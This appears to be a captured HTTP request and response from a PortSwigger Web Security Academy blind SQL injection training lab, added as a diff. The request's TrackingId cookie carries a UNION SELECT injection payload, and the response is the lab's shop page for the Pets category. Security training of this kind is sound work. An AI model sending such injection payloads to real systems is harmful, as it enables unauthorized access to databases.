@@ -1,0 +1,118 @@
+:scheme: https
+:method: GET
+:path: /filter?category=Pets
+:authority: 0a3c003f047e86b780bc1ced00270073.web-security-academy.net
+cookie: TrackingId=w8dZA9059o2bdQbP'union+select+version()--
+cookie: session=J58Ifnfhuan2ZFxxWfUVlHMmeeHklSbs
+user-agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+accept-language: en-US,en;q=0.5
+accept-encoding: gzip, deflate, br
+referer: https://0a3c003f047e86b780bc1ced00270073.web-security-academy.net/
+upgrade-insecure-requests: 1
+sec-fetch-dest: document
+sec-fetch-mode: navigate
+sec-fetch-site: same-origin
+sec-fetch-user: ?1
+te: trailers
+
+
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
+        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
+        <title>Blind SQL injection with conditional responses</title>
+    </head>
+    <body>
+        <script src="/resources/labheader/js/labHeader.js"></script>
+        <div id="academyLabHeader">
+            <section class='academyLabBanner'>
+                <div class=container>
+                    <div class=logo></div>
+                        <div class=title-container>
+                            <h2>Blind SQL injection with conditional responses</h2>
+                            <a id='lab-link' class='button' href='/'>Back to lab home</a>
+                            <a class=link-back href='https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses'>
+                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
+                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
+                                    <g>
+                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
+                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
+                                    </g>
+                                </svg>
+                            </a>
+                        </div>
+                        <div class='widgetcontainer-lab-status is-notsolved'>
+                            <span>LAB</span>
+                            <p>Not solved</p>
+                            <span class=lab-status-icon></span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </div>
+        <div theme="ecommerce">
+            <section class="maincontainer">
+                <div class="container is-page">
+                    <header class="navigation-header">
+                        <section class="top-links">
+                            <a href=/>Home</a><p>|</p>
+                            <a href="/my-account">My account</a><p>|</p>
+                        </section>
+                    </header>
+                    <header class="notification-header">
+                    </header>
+                    <section class="ecoms-pageheader">
+                        <img src="/resources/images/shop.svg">
+                    </section>
+                    <section class="ecoms-pageheader">
+                        <h1>Pets</h1>
+                    </section>
+                    <section class="search-filters">
+                        <label>Refine your search:</label>
+                        <a class="filter-category" href="/">All</a>
+                        <a class="filter-category" href="/filter?category=Clothing%2c+shoes+and+accessories">Clothing, shoes and accessories</a>
+                        <a class="filter-category" href="/filter?category=Food+%26+Drink">Food & Drink</a>
+                        <a class="filter-category" href="/filter?category=Lifestyle">Lifestyle</a>
+                        <a class="filter-category selected" href="/filter?category=Pets">Pets</a>
+                        <a class="filter-category" href="/filter?category=Toys+%26+Games">Toys & Games</a>
+                    </section>
+                    <section class="container-list-tiles">
+                        <div>
+                            <img src="/image/productcatalog/products/15.jpg">
+                            <h3>Pet Experience Days</h3>
+                            <img src="/resources/images/rating5.png">
+                            $13.53
+                            <a class="button" href="/product?productId=1">View details</a>
+                        </div>
+                        <div>
+                            <img src="/image/productcatalog/products/22.jpg">
+                            <h3>Babbage Web Spray</h3>
+                            <img src="/resources/images/rating3.png">
+                            $75.01
+                            <a class="button" href="/product?productId=6">View details</a>
+                        </div>
+                        <div>
+                            <img src="/image/productcatalog/products/56.jpg">
+                            <h3>More Than Just Birdsong</h3>
+                            <img src="/resources/images/rating5.png">
+                            $81.72
+                            <a class="button" href="/product?productId=11">View details</a>
+                        </div>
+                        <div>
+                            <img src="/image/productcatalog/products/10.jpg">
+                            <h3>Giant Grasshopper</h3>
+                            <img src="/resources/images/rating5.png">
+                            $65.28
+                            <a class="button" href="/product?productId=16">View details</a>
+                        </div>
+                    </section>
+                </div>
+            </section>
+            <div class="footer-wrapper">
+            </div>
+        </div>
+    </body>
+</html>
